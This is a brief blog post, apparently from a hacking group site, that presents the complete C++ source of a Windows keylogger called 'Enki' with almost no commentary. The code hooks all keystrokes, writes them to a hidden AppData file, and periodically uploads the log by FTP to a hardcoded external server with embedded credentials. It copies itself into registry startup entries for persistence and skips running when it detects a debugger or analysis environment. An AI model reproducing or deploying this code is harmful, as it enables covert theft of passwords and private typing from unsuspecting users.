---
layout: post
title:  "Test post"
date:   2016-04-24 00:00:00 +0100
categories: who nullbyte
tags:
 - test
author: dTm
---

## Test post from dTm

Suh dudes.

## Some random Keylogger code here in C++

{% highlight c++ linenos %}
#include <string.h>
#include <Windows.h>
#include <WinInet.h>
#include <ShlObj.h>

#pragma comment(lib, "WININET")

#define DEBUG
#define STARTUP
#define CHECK_ENV

#define NAME "Enki"
#define KEY_FILE "\\keylog.txt"

// FTP settings
#define FTP_SERVER "185.27.134.11"
#define FTP_USERNAME "b22_15913214"
#define FTP_PASSWORD "huihui1A"
#define FTP_LOG_PATH "/htdocs/Enki_Log.txt"

#define MAX_LOG_SIZE 4096
#define BUF_SIZ 1024
#define BUF_LEN 1
#define MAX_VALUE_NAME 16383

#define HOTKEY_ID 69

#define TIMEOUT 1000 * 60 * 1 // minutes

// global handle to file
HANDLE ghFile = NULL;
// global handle to hook
HHOOK ghHook = NULL;
// global handle to mutex
HANDLE ghMutex = NULL;

// global handle to log heap
HANDLE ghLogHeap = NULL;
// global string pointer to log buffer
LPSTR lpLogBuf = NULL;
// current max size of log buffer
DWORD dwLogBufSize = 0;

// timer
DWORD dwTime = 0;

// keylog file path
CHAR LogFilePath[MAX_PATH];

// key logging status
int nLogFlag = 1;  // enabled by default

// error message handler function
VOID Fatal(LPCSTR s) {
#ifdef DEBUG
	CHAR err_buf[BUF_SIZ];

	wsprintf(err_buf, "%s failed: %lu", s, GetLastError());
	MessageBox(NULL, err_buf, NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif

	ExitProcess(1);
}

// clean up function on exit
VOID CleanUp(VOID) {
	if (lpLogBuf && ghLogHeap) HeapFree(ghLogHeap, 0, lpLogBuf);
	if (ghFile) CloseHandle(ghFile);
	if (ghHook) UnhookWindowsHookEx(ghHook);
	if (ghMutex) CloseHandle(ghMutex);
	//UnregisterHotKey(NULL, HOTKEY_ID);
}

VOID FTPSend(VOID) {
	HANDLE hMutex = CreateMutex(NULL, TRUE, "EnkiFTP");
	if (hMutex == NULL) {
		ExitThread(1);
	}

	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		ExitThread(1);
	}

	CloseHandle(ghFile);

	HINTERNET hInet = InternetOpen(NAME, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, INTERNET_FLAG_ASYNC);
	if (hInet == NULL) {
		ReleaseMutex(hMutex);
		CloseHandle(hMutex);
		ExitThread(1);
	}

	HINTERNET hFTP = InternetConnect(hInet, FTP_SERVER, INTERNET_DEFAULT_FTP_PORT, FTP_USERNAME, FTP_PASSWORD, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, NULL);
	if (hFTP == NULL) {
		InternetCloseHandle(hInet);
		CloseHandle(hMutex);
		ReleaseMutex(hMutex);
		ExitThread(1);
	}

	if (FtpPutFile(hFTP, LogFilePath, FTP_LOG_PATH, FTP_TRANSFER_TYPE_BINARY, NULL) == FALSE) {
		InternetCloseHandle(hFTP);
		InternetCloseHandle(hInet);
		ReleaseMutex(hMutex);
		CloseHandle(hMutex);
		ExitThread(1);
	}

	InternetCloseHandle(hFTP);
	InternetCloseHandle(hInet);
	ReleaseMutex(hMutex);
	CloseHandle(hMutex);

	ghFile = CreateFile(LogFilePath, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (ghFile == NULL) {
		Fatal("Failed to create keylog file");
	}

	ExitThread(0);
}

// callback function when key is pressed
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
	BYTE lpKeyState[256] = { 0 };
	CHAR szKey[1];
	
	// wParam and lParam have info about keyboard message
	if (nCode == HC_ACTION && nLogFlag == 1) {
		// if key is pressed or held
		if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {

			// map keyboard state
			if (GetKeyboardState(lpKeyState) == FALSE) {
				Fatal(L"Failed to get keyboard state");
			}
			ToAscii(kbd->vkCode, kbd->scanCode, lpKeyState, szKey, 0);

			// get string length of log buffer
			DWORD dwLogBufLen = strlen(lpLogBuf);

			// if timeout or if log buffer has hit max size
			// should thread timer but dunno how to lock variables
			if (GetTickCount() - dwTime >= TIMEOUT || dwLogBufLen == MAX_LOG_SIZE) {
				// write out to file
				SetFilePointer(ghFile, 0, NULL, FILE_END);
				WriteFile(ghFile, lpLogBuf, dwLogBufLen, NULL, NULL);
				// reset timer
				dwTime = GetTickCount();
				// reset log buffer size
				lpLogBuf = HeapReAlloc(ghLogHeap, HEAP_ZERO_MEMORY, lpLogBuf, BUF_SIZ + 1);
				dwLogBufSize = BUF_SIZ + 1;
				if (lpLogBuf == NULL) {
					Fatal("Reset log buffer");
				}
				
				// create thread to send log file to ftp server
				if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FTPSend, NULL, 0, NULL) == NULL) {
					Fatal("Create thread");
				}
			// if string length of log buffer is approaching max size
			} else if (dwLogBufLen >= dwLogBufSize - 1) {
				// double max size
				// should not go over MAX_LOG_SIZE
				lpLogBuf = HeapReAlloc(ghLogHeap, 0, lpLogBuf, dwLogBufSize * 2);
				if (lpLogBuf == NULL) {
					Fatal("ReAlloc log buffer");
				}
				dwLogBufSize *= 2;
			}
			
			// copy vkCode into log buffer
			switch (kbd->vkCode) {
				case VK_BACK:
					strncat(lpLogBuf, "[BSPACE]", 8);
					break;
				case VK_SHIFT:
					strncat(lpLogBuf, "[SHIFT]", 7);
					break;
				case VK_RETURN:
					strncat(lpLogBuf, "[ENTER]", 7);
					break;
				case VK_CAPITAL:
					strncat(lpLogBuf, "[CAPS]", 6);
					break;
				case VK_CONTROL:
					strncat(lpLogBuf, "[CTRL]", 6);
					break;
				case VK_TAB:
					strncat(lpLogBuf, "[TAB]", 5);
					break;
				case VK_MENU:
					strncat(lpLogBuf, "[ALT]", 5);
					break;
				case VK_ESCAPE:
					strncat(lpLogBuf, "[ESC]", 5);
					break;
				default:
					strncat(lpLogBuf, szKey, 1);
					break;
			}
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

#ifdef STARTUP
BOOL FileExists(LPSTR File) {
	DWORD dwAttributes = GetFileAttributes(File);

	return dwAttributes != INVALID_FILE_ATTRIBUTES && !(dwAttributes & FILE_ATTRIBUTE_DIRECTORY);
}

VOID InstallStartup(LPCSTR Path) {
	HKEY hKey;

	RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey);
	if (hKey == NULL) {
		Fatal("Open registry key");
	}

	CHAR Value[MAX_VALUE_NAME];
	CHAR Data[MAX_VALUE_NAME];

	DWORD i, ret = ERROR_SUCCESS;
	for (i = 0; ret == ERROR_SUCCESS; i++) {
		DWORD dwValueSize = MAX_VALUE_NAME;
		DWORD dwDataSize = MAX_VALUE_NAME;

		ret = RegEnumValue(hKey, i, Value, &dwValueSize, NULL, NULL, Data, &dwDataSize);
		//MessageBox(NULL, Data, "Enki - STARTUPer", MB_OK);

		if (FileExists(Data) == FALSE) {
			if (CopyFile(Path, Data, FALSE) == TRUE) {
				//MessageBox(NULL, "File successfully copied.", "Enki - STARTUPer", MB_OK);
				break;
			} else {
				//MessageBox(NULL, "Failed to copy file.", "Enki - STARTUPer", MB_OK);
			}
		} else {
			break;
		}
	}

	RegCloseKey(hKey);
}
#endif

#ifdef CHECK_ENV
BOOL CheckEnvironment(VOID) {
	// check debugger
	if (IsDebuggerPresent() == TRUE) {
		return FALSE;
	}

	// check for USB artifact
	HKEY hKey;

	// open key
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Enum\\USBSTOR", 0, KEY_QUERY_VALUE, &hKey);
	if (hKey == NULL) {
		Fatal("Open registry key");
	}

	DWORD dwNumberOfKeys = 0;
	// check USB artifacts
	if (RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwNumberOfKeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
		Fatal("Query registry info key");
	}

	// if no USBs came in contact with system, abort
	if (dwNumberOfKeys == 0) {
		return FALSE;
	}

	return TRUE;	
}
#endif

// main function
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
#ifdef CHECK_ENV
	// check debugging
	if (CheckEnvironment() == FALSE) {
		return 0;
	}
#endif

	// mutex to prevent other keylog instances
	ghMutex = CreateMutex(NULL, TRUE, NAME);
	if (ghMutex == NULL) {
		Fatal("Create mutex");
	}
	if (GetLastError() == ERROR_ALREADY_EXISTS) {
		ExitProcess(1);
	}

	// declare handle cleaner on exit
	atexit(CleanUp);

	// set key file in C:\%username%\AppData\Roaming\Enki\keylog.txt
	HRESULT hRes = SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, LogFilePath);
	if (hRes != S_OK) {
		Fatal("Set key file");
	}
	strncat(LogFilePath, "\\", strlen("\\"));
	strncat(LogFilePath, NAME, strlen(NAME));

	CreateDirectory(LogFilePath, NULL);

	strncat(LogFilePath, KEY_FILE, strlen(KEY_FILE));

	// create/open existing keylog file
	// no sharing so that no other processes can access the file
	// while the keylogger program is still running
	ghFile = CreateFile(LogFilePath, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (ghFile == NULL) {
		Fatal("Failed to create keylog file");
	}

#ifdef STARTUP
	CHAR ExeFilePath[MAX_PATH];

	GetModuleFileName(NULL, ExeFilePath, sizeof(ExeFilePath));

	InstallStartup(ExeFilePath);
#endif

	// allocate heap buffer
	ghLogHeap = HeapCreate(0, BUF_SIZ + 1, 0);
	if (ghLogHeap == NULL) {
		Fatal("Heap create");
	}

	lpLogBuf = HeapAlloc(ghLogHeap, HEAP_ZERO_MEMORY, BUF_SIZ + 1);
	if (lpLogBuf == NULL) {
		Fatal("Heap alloc");
	}
	dwLogBufSize = BUF_SIZ + 1;

	// hotkey for logging status
	RegisterHotKey(NULL, HOTKEY_ID, MOD_ALT, VK_F12);

	// set initial timer
	dwTime = GetTickCount();

#ifdef SCREENSHOTS
	// screenshot thread
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CaptureScreen, NULL, 0, NULL);
	if (hThread == NULL) {
		Fatal("Capture screen thread");
	}
#endif

	// set keyboard hooking subroutine
	ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
	if (ghHook == NULL) {
		CloseHandle(ghFile);
		Fatal("Failed to set keyboard hook");
	}

	MSG msg;
	while (GetMessage(&msg, 0, 0, 0) != 0) {
		// if hotkey is pressed
		if (msg.message == WM_HOTKEY) {
			// if ALT+F12 pressed
			if (HIWORD(msg.lParam) == VK_F12 && LOWORD(msg.lParam) == MOD_ALT) {
				// set logging status
				nLogFlag *= -1;
				if (nLogFlag == 1) {
#ifdef DEBUG
					MessageBox(NULL, "Logging enabled", "Enki - HotKey", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
				} else {
					MessageBox(NULL, "Logging disabled", "Enki - HotKey", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
#endif
				}
			}
		}

		TranslateMessage(&msg);
		DispatchMessage(&msg);	
	}

	UnhookWindowsHookEx(ghHook);
	CloseHandle(ghFile);
	UnregisterHotKey(NULL, HOTKEY_ID);

	return 0;
}
{% endhighlight %}

So yeah.

kthxbyelawlz

-- dTm
